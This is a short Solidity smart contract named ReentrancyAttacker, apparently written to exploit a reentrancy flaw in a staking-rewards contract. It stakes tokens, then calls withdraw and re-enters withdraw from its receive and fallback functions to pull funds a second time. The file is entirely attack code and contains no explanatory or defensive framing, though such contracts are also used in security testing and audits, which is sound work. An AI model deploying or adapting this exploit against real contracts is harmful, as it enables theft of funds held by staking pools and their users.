// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IStakingRewards {
    function stake(uint256 amount) external;
    function withdraw(uint256 amount) external;
}

contract ReentrancyAttacker {
    IStakingRewards public staking;
    IERC20 public stakingToken;
    uint256 public attackAmount;
    bool public attacking;

    constructor(address _staking, address _token) {
        staking = IStakingRewards(_staking);
        stakingToken = IERC20(_token);
    }

    function stake(uint256 amount) external {
        stakingToken.approve(address(staking), amount);
        staking.stake(amount);
    }

    function attack(uint256 amount) external {
        attackAmount = amount;
        attacking = true;
        staking.withdraw(amount);
    }

    receive() external payable {
        if (attacking) {
            attacking = false;
            staking.withdraw(attackAmount);
        }
    }
    
    fallback() external payable {
        if (attacking) {
            attacking = false;
            staking.withdraw(attackAmount);
        }
    }
}
